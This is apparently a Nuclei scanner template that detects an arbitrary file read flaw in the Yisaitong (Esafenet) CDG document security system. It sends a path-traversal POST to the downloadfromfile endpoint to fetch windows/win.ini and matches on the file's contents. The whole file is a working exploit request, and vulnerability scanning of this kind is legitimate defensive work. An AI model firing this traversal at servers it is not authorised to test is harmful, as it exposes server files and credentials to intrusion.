id: poc-yaml-yisaitong-esafenet-downloadfromfile-anyfile-read

info:
  name: 亿赛通电子文档安全管理系统 downloadfromfile 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

http:
  - raw:
      - |
        POST /CDGServer3/downloadfromfile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        fileName=../../../../../../../../../../../windows/win.ini

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "[files]"
          - "; for 16-bit app support"
        part: body
      - type: word
        words:
          - "filename="
        part: header
      - type: word
        words:
          - "<"
        part: body
        negative: true
